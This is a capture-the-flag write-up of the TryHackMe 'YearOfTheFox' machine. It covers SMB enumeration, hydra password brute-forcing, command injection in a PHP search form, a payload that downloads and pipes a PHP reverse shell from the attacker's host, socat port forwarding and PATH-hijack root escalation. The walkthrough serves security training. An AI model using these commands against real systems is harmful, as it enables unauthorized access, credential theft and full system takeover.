---
description: YearOfTheFox box from TryHackMe! write up.
---

# YearOfTheFox

[Link to the room](https://tryhackme.com/room/yotf)

## Enumeration

Let's start checking for open ports:

```
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: <MACHINE_IP>
------------------------------------------------------------
Scanning target <MACHINE_IP>
Time started: 2021-05-20 11:21:53.011113
------------------------------------------------------------
Port 80 is open
Port 139 is open
Port 445 is open
Port scan completed in 0:00:19.643396
------------------------------------------------------------
```

And now a typical `nmap` scan:

```
┌──(kali㉿kali)-[~]
└─$ nmap -p80,139,445 -sV -sC <MACHINE_IP>                    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 11:23 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.049s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -19m55s, deviation: 34m37s, median: 3s
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2021-05-20T16:24:02+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-20T15:24:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.01 seconds
```

So a webpage and Samba, let's check them out. The webpage ask for a password so i will just check that Samba server instead.

### Samba

```
┌──(kali㉿kali)-[~]
└─$ enum4linux <MACHINE_IP>         
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu May 20 11:43:36 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... <MACHINE_IP>
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on <MACHINE_IP>    |
 ===================================================== 
[+] Got domain/workgroup name: YEAROFTHEFOX

 ============================================= 
|    Nbtstat Information for <MACHINE_IP>    |
 ============================================= 
Looking up status of <MACHINE_IP>
	YEAR-OF-THE-FOX <00> -         B <ACTIVE>  Workstation Service
	YEAR-OF-THE-FOX <03> -         B <ACTIVE>  Messenger Service
	YEAR-OF-THE-FOX <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	YEAROFTHEFOX    <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	YEAROFTHEFOX    <1d> -         B <ACTIVE>  Master Browser
	YEAROFTHEFOX    <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on <MACHINE_IP>    |
 ====================================== 
[+] Server <MACHINE_IP> allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for <MACHINE_IP>    |
 ============================================ 
Domain Name: YEAROFTHEFOX
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on <MACHINE_IP>    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for <MACHINE_IP> from smbclient: 
[+] Got OS info for <MACHINE_IP> from srvinfo:
	YEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on <MACHINE_IP>    |
 ============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox	Name: fox	Desc: 

user:[fox] rid:[0x3e8]

 ========================================== 
|    Share Enumeration on <MACHINE_IP>    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	yotf            Disk      Fox's Stuff -- keep out!
	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on <MACHINE_IP>
//<MACHINE_IP>/yotf	Mapping: DENIED, Listing: N/A
//<MACHINE_IP>/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for <MACHINE_IP>    |
 ===================================================== 


[+] Attaching to <MACHINE_IP> using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] YEAR-OF-THE-FOX
	[+] Builtin

[+] Password Info for Domain: YEAR-OF-THE-FOX

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =============================== 
|    Groups on <MACHINE_IP>    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on <MACHINE_IP> via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-978893743-2663913856-222388731
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)
```
Ok, interesting things: a share called `yotf` and also some system users: `fox` and `rascal`. Looks like i can't really get nothing more so maybe we can try to brutefoce. I will start with the webpage because im more use to this kind of attacks in web.

### Webpage

I used `hydra` to try to bruteforce the password for the users i found earlier: `hydra -l <USER> -P rockyou.txt -s 80 -f <MACHINE_IP> http-get /`. I didn't get something useful with the `fox` user but `rascal` in the other hand had an easy password to guess using `rockyou`: `rascal:****` cool.

Now we can access the webpage: 'Rascal's Search System'. I tried to search something random and the page said 'file not found', i tried a `.` and got the files in the current directory:

```
creds2.txt
fox.txt
important-data.txt
```

The text box will delete `/` or any other 'bad' characters using javascript, i guess i can just bypass that making a POST request directly to `/assets/php/search.php`. I wrote a python script for it, and after a lot of time i got RCE: `\"; ping <ATACKER_IP>; \"`. Using `sudo tcpdump -i tun0 -n` i could check that the ping request arrived to my machine.


#### Reverse shell

Looks like the backend is filtering characters too so getting a reverse shell was a bit hard but after a while i got this payload to work:

```
"\"; wget -O - -q http://<ATACKER_IP>:8000/php-reverse-shell.php | php; \""
```

This will connect to my machine in the port 8000, get a php reverse shell and then pipe the php code into the `php` command. Using that i was able to get a shell.

To get the flag just:

```
www-data@year-of-the-fox:/$ cat /var/www/web-flag.txt
THM{*********************************}
```

And also i will get the files content we saw before:

```
creds2.txt
LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAX
UTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=
```

The rest of the files are empty. By the way the file content looks like junk.

## Privesc

### User

After some digging, i decided to use `linpeas` and check if i can see something interesting. This is what caught my attention:

```
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -  <---                 
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      - 

[+] Searching ssl/ssh files
ListenAddress 127.0.0.1 
ChallengeResponseAuthentication no
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

```

Is that `ssh` only in localhost?

```
www-data@year-of-the-fox:/tmp$ netstat -tulp | grep ssh
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 localhost:ssh           0.0.0.0:*               LISTEN      -  

```

Yep, it is. Also inside the `/etc/ssh/ssh_config` i can see that only the user `fox` is allowed to connect through it. To get access to this service from our machine i will use `socat` to open a port in the remote machine and i will forward it to the port 22:

```
/tmp/socat tcp-listen:8080,reuseaddr,fork tcp:localhost:22
```

After executing that the `ssh` service is available in the port 8080 of the target machine. I will try to brute force it with `hydra`:

```
┌──(kali㉿kali)-[~]
└─$ hydra -l fox -P ~/rockyou.txt <MACHINE_IP> -s 8080 -t 4 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-20 16:24:28
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://<MACHINE_IP>:8080/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
[8080][ssh] host: <MACHINE_IP>   login: fox   password: ******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-20 16:27:24
```

The credentials are `fox:*****`. To get the flag just execute:
```
fox@year-of-the-fox:~$ cat /home/fox/user-flag.txt 
THM{*********************************}
```

### Root

I checked the samba folder but nothing worth in there. I tried the typical `sudo -l` command to check if the user can use something interesting with `sudo` and this is what i got:

```
fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
```

That `shutdown` binary could be interesting, let's check it out. I used `strings` to check if i can see something interesting and i saw that the binary use something called `poweroff` and use a relative `PATH` lets abuse that.

First i will execute `export PATH="$HOME:$PATH"` to add the user home folder to the `PATH` and i will create a script called `poweroff` in there:

```
#!/bin/bash

id
exit
```

This way this script will run instead of the proper binary. Let's try this PoC:

```
fox@year-of-the-fox:~$ shutdown 
uid=1000(fox) gid=1000(fox) groups=1000(fox),114(sambashare)
fox@year-of-the-fox:~$ sudo shutdown 
uid=0(root) gid=0(root) groups=0(root)
```

Cool, it worked. Let's edit the `poweroff` script a bit to get something more interesting:

```
#!/bin/bash

bash
exit
```

```
fox@year-of-the-fox:~$ sudo shutdown 
root@year-of-the-fox:~#
```
An we are now root nice, let's get that root flag and...

```
root@year-of-the-fox:/home/rascal# cat /root/root.txt 
Not here -- go find!
```

Really? Ok so let's check the rascal user home folder:

```
root@year-of-the-fox:/home/rascal# ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .did-you-think-I-was-useless.root  .profile
```

There you are!

```
root@year-of-the-fox:/home/rascal# cat .did-you-think-I-was-useless.root 
T
H
M
{*******
********
********
********

Here's the prize:

YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMw
Mwo=

Good luck!
```

The base64 thing... i don't really know what it is to be honest.
